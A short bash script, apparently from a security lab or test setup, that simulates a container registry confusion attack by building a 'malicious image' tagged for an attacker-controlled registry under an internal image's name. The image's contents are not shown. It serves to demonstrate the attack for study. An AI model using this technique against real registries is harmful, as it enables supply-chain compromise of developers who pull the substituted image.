#!/bin/bash
# Simulates registry confusion: push an image to an external registry
# with the same name as an internal image
set -euo pipefail
INTERNAL_REGISTRY="${INTERNAL_REGISTRY:-registry:5000}"
ATTACKER_REGISTRY="${ATTACKER_REGISTRY:-pypi-public:8080}"
echo "[*] Pushing malicious image to attacker-controlled registry..."
docker build -t "$ATTACKER_REGISTRY/mycompany/webapp:latest" malicious-image/
echo "[!] If a developer's Docker config searches this registry first,"
echo "    they pull the attacker's image instead of the internal one."
